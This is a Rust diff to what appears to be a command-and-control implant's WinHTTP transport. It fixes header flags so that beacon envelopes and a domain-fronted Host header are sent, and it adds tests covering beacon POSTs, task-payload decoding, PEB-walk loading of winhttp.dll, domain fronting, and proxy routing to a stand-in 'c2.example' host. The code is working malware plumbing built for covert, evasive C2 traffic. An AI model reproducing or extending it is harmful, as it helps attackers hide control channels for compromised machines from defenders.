@@ -457,7 +457,15 @@ unsafe fn post_frame_add_headers(
             // missing the envelope (or drop the frame outright), so treat it as
             // a channel failure and let the fallback chain pick another
             // transport.
-            if add_req_headers(req, hdr16.as_ptr(), hdr_len, 0x8000_0000) == 0 {
+            //
+            // Modifier flags: WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE
+            // (0xA0000000) — "set this header" semantics. Bare REPLACE
+            // (0x80000000) FAILS when the header doesn't already exist on the
+            // request (ERROR_WINHTTP_HEADER_NOT_FOUND — verified against wine's
+            // WinHTTP, which enforces the same strict semantics), and profile
+            // headers are always fresh on a new request, so ADD|REPLACE is
+            // required for the envelope to ever reach the wire.
+            if add_req_headers(req, hdr16.as_ptr(), hdr_len, 0xA000_0000) == 0 {
                 return false;
             }
         }
@@ -858,8 +866,9 @@ unsafe fn post_frame_enhanced_add_headers(
             hdr.extend_from_slice(b"\r\n");
         }
         // Domain fronting: override the Host header. WinHttpAddRequestHeaders
-        // with WINHTTP_ADDREQ_FLAG_ADD_OR_REPLACE (0x80000000) replaces the
-        // auto-generated Host: <connect_host> with the fronting domain.
+        // with ADD|REPLACE (0xA0000000, applied at the send call below)
+        // replaces the auto-generated Host: <connect_host> with the fronting
+        // domain (and ADDs it when WinHTTP hasn't materialized one yet).
         if !fronting_host.is_empty() {
             hdr.extend_from_slice(b"Host: ");
             hdr.extend_from_slice(fronting_host);
@@ -871,7 +880,11 @@ unsafe fn post_frame_enhanced_add_headers(
             // Propagate header-set failure — same rationale as post_frame: the
             // fronting Host header (and in the header-terminator case the whole
             // frame) rides in these headers; a failed add is a channel failure.
-            if add_req_headers(req, hdr16.as_ptr(), hdr_len, 0x8000_0000) == 0 {
+            // Flags are ADD|REPLACE (0xA0000000): bare REPLACE fails when the
+            // header doesn't exist yet (see post_frame_add_headers), and the
+            // fronting Host replace only works if ADD|REPLACE also ADDS when
+            // WinHTTP hasn't materialized its auto-Host header yet.
+            if add_req_headers(req, hdr16.as_ptr(), hdr_len, 0xA000_0000) == 0 {
                 return false;
             }
         }
@@ -960,3 +973,177 @@ unsafe fn post_frame_enhanced_read_response(
     }
     Some(out)
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::testutil;
+    use std::time::Duration;
+
+    #[test]
+    fn to_utf16_zero_extends_ascii_and_nul_terminates() {
+        assert_eq!(to_utf16(b"abc").as_slice(), &[0x61u16, 0x62, 0x63, 0]);
+        assert_eq!(to_utf16(b"").as_slice(), &[0u16]);
+        // Bytes are zero-extended, never UTF-8-decoded (hosts/paths are ASCII).
+        assert_eq!(to_utf16(&[0xC3, 0xA9]).as_slice(), &[0xC3u16, 0xA9, 0]);
+    }
+
+    #[test]
+    fn tls_insecure_retry_reflects_build_env() {
+        // Default builds (env unset) must NOT relax certificate validation;
+        // only an explicit NYX_TLS_INSECURE=1 at build time opts in.
+        let expect = matches!(option_env!("NYX_TLS_INSECURE"), Some("1"));
+        assert_eq!(tls_insecure_retry(), expect);
+    }
+
+    #[test]
+    fn shape_envelope_matches_baked_steps_and_terminator() {
+        let body = b"\x01\x02frame-bytes\xFE\xFF";
+        let (_headers, wire_body, data_header) = post_frame_shape_envelope(body);
+        let expected = nyx_profile::encode(&crate::envelopes::post_client_steps(), body);
+        match crate::envelopes::post_client_terminator() {
+            Some(nyx_profile::Terminator::Header(name)) => {
+                // Header terminator: the ENTIRE frame rides in the header.
+                assert!(wire_body.is_empty());
+                let (n, v) = data_header.as_ref().expect("header terminator ⇒ data header");
+                assert_eq!(n, name.as_bytes());
+                assert_eq!(*v, expected);
+            }
+            _ => {
+                assert!(data_header.is_none());
+                assert_eq!(wire_body, expected);
+            }
+        }
+        // Enhanced path shapes identically.
+        let (_h2, wire2, dh2) = post_frame_enhanced_shape_envelope(body);
+        assert_eq!(wire2, wire_body);
+        assert_eq!(dh2, data_header);
+    }
+
+    #[test]
+    fn invert_server_envelope_decodes_baked_steps() {
+        let ssteps = crate::envelopes::post_server_steps();
+        let payload = b"task-payload-\x00\xFF\x10";
+        let mut out = nyx_profile::encode(&ssteps, payload);
+        post_frame_invert_server_envelope(&mut out);
+        assert_eq!(out, payload);
+        // A body that fails decode is kept RAW so the frame parse fails loudly
+        // upstream instead of silently dropping the cycle.
+        if !ssteps.is_empty() {
+            let garbage: Vec<u8> = Vec::from([0xFF, 0xFE, 0xFD, 0xFC, 0xFB].as_slice());
+            if nyx_profile::decode(&ssteps, &garbage).is_err() {
+                let mut out = garbage.clone();
+                post_frame_invert_server_envelope(&mut out);
+                assert_eq!(out, garbage);
+            }
+        }
+    }
+
+    /// End-to-end WinHTTP round trip against a one-shot 127.0.0.1 server:
+    /// verifies PEB-walk resolution of winhttp.dll, the open/connect/send/
+    /// receive chain, client-envelope shaping on the wire, and server-envelope
+    /// inversion on the response.
+    #[test]
+    fn post_frame_loopback_roundtrip() {
+        let payload = b"frame-\xDE\xAD\xBE\xEF";
+        let (port, rx) = testutil::one_shot_http_server(testutil::server_wire_response(b"TASKS"));
+        let out = unsafe { post_frame(b"127.0.0.1", port, b"/beacon", payload, false) };
+        assert_eq!(out.as_deref(), Some(b"TASKS".as_slice()));
+        let cap = rx
+            .recv_timeout(Duration::from_secs(15))
+            .expect("server captured request");
+        assert!(
+            cap.request_line.starts_with("POST /beacon "),
+            "request line: {}",
+            cap.request_line
+        );
+        // Whatever the client envelope did to the body is what hit the wire.
+        let (_h, wire_body, data_header) = post_frame_shape_envelope(payload);
+        match data_header {
+            Some((n, v)) => {
+                assert!(wire_body.is_empty());
+                assert!(cap.body.is_empty(), "body must be empty with header terminator");
+                let needle = format!(
+                    "{}: {}",
+                    String::from_utf8_lossy(&n),
+                    String::from_utf8_lossy(&v)
+                )
+                .to_lowercase();
+                assert!(
+                    cap.headers.contains(&needle),
+                    "data header missing; got headers:\n{}",
+                    cap.headers
+                );
+            }
+            None => assert_eq!(cap.body, wire_body),
+        }
+        // User-Agent: the profile's baked UA, else the transport default.
+        let ua = if crate::envelopes::POST_CLIENT_UA.is_empty() {
+            "mozilla/5.0".to_string()
+        } else {
+            String::from_utf8_lossy(crate::envelopes::POST_CLIENT_UA).to_lowercase()
+        };
+        assert!(
+            cap.headers.contains(&format!("user-agent: {ua}")),
+            "UA header missing; got headers:\n{}",
+            cap.headers
+        );
+    }
+
+    #[test]
+    fn post_frame_closed_port_returns_none() {
+        // Bind then drop → a port nothing listens on: connect must fail and
+        // map to None (channel failure → fallback chain), never panic/hang.
+        let port = {
+            let l = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
+            l.local_addr().unwrap().port()
+        };
+        assert!(unsafe { post_frame(b"127.0.0.1", port, b"/beacon", b"x", false) }.is_none());
+    }
+
+    #[test]
+    fn post_frame_enhanced_fronting_host_overrides_host_header() {
+        let (port, rx) = testutil::one_shot_http_server(testutil::server_wire_response(b"OK"));
+        let opts = HttpOpts {
+            fronting_host: b"cdn-front.example",
+            proxy_url: b"",
+        };
+        let out = unsafe { post_frame_enhanced(b"127.0.0.1", port, b"/beacon", b"PING", false, &opts) };
+        assert_eq!(out.as_deref(), Some(b"OK".as_slice()));
+        let cap = rx
+            .recv_timeout(Duration::from_secs(15))
+            .expect("server captured request");
+        // Domain fronting: TCP went to 127.0.0.1 but the Host header carries
+        // the fronting domain.
+        assert!(
+            cap.headers.contains("host: cdn-front.example"),
+            "fronting Host header missing; got headers:\n{}",
+            cap.headers
+        );
+    }
+
+    #[test]
+    fn post_frame_enhanced_named_proxy_routes_via_proxy() {
+        let (port, rx) = testutil::one_shot_http_server(testutil::server_wire_response(b"OK"));
+        let proxy = format!("127.0.0.1:{port}");
+        let opts = HttpOpts {
+            fronting_host: b"",
+            proxy_url: proxy.as_bytes(),
+        };
+        // server_host is unresolvable — only the proxy path can succeed.
+        let out = unsafe {
+            post_frame_enhanced(b"c2.example", 8443, b"/beacon", b"PING", false, &opts)
+        };
+        assert_eq!(out.as_deref(), Some(b"OK".as_slice()));
+        let cap = rx
+            .recv_timeout(Duration::from_secs(15))
+            .expect("proxy captured request");
+        // A proxy request uses absolute-form: POST http://host:port/beacon.
+        assert!(
+            cap.request_line.contains("/beacon"),
+            "request line: {}",
+            cap.request_line
+        );
+    }
+}
+
